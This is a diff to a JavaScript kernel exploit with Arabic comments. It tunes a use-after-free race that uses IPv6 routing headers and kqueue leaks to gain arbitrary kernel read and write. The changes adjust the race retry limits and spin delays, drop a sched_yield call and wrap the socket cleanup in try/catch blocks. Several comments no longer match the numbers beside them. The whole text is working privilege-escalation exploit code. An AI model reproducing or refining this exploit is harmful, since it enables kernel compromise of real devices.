@@ -1182,10 +1182,24 @@ function setup_arbitrary_rw() {
   safe_fhold_fd(victim_pipe[0], 'victim_pipe[0]');
   safe_fhold_fd(victim_pipe[1], 'victim_pipe[1]');
 
-  // 9) تنظيف rthdr
-  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
-  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
-  remove_rthr_from_socket(ipv6_socks[triplets[2]]);
+  // 9) تنظيف rthdr (best-effort)
+  try {
+    remove_rthr_from_socket(ipv6_socks[triplets[0]]);
+  } catch (e) {
+    log("remove_rthr_from_socket triplet[0] failed (ignored)");
+  }
+
+  try {
+    remove_rthr_from_socket(ipv6_socks[triplets[1]]);
+  } catch (e) {
+    log("remove_rthr_from_socket triplet[1] failed (ignored)");
+  }
+
+  try {
+    remove_rthr_from_socket(ipv6_socks[triplets[2]]);
+  } catch (e) {
+    log("remove_rthr_from_socket triplet[2] failed (ignored)");
+  }
 
   // 10) إزالة الملف الثلاثي freed
   remove_uaf_file();
@@ -1634,8 +1648,8 @@ function leak_kqueue() {
   var magic_add  = leak_rthdr.add(0x08);
 
   var count      = 0;
-  var MAX_KQ     = 7000;     // أقل من 2000 لأن النجاح بقى أعلى
-  var INNER_MAX  = 200;      // أعلى من 500 لزيادة فرصة الـ window
+  var MAX_KQ     = 10000;     // أقل من 2000 لأن النجاح بقى أعلى
+  var INNER_MAX  = 100;      // أعلى من 500 لزيادة فرصة الـ window
 
   var success    = false;
 
@@ -1659,7 +1673,7 @@ function leak_kqueue() {
     while (inner_tries < INNER_MAX) {
 
       // دبق خفيف
-      for (var d = 0; d < 15; d++) {
+      for (var d = 0; d < 10; d++) {
         // noop
       }
 
@@ -1680,7 +1694,7 @@ function leak_kqueue() {
 
       inner_tries++;
     }
-    sched_yield();
+
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
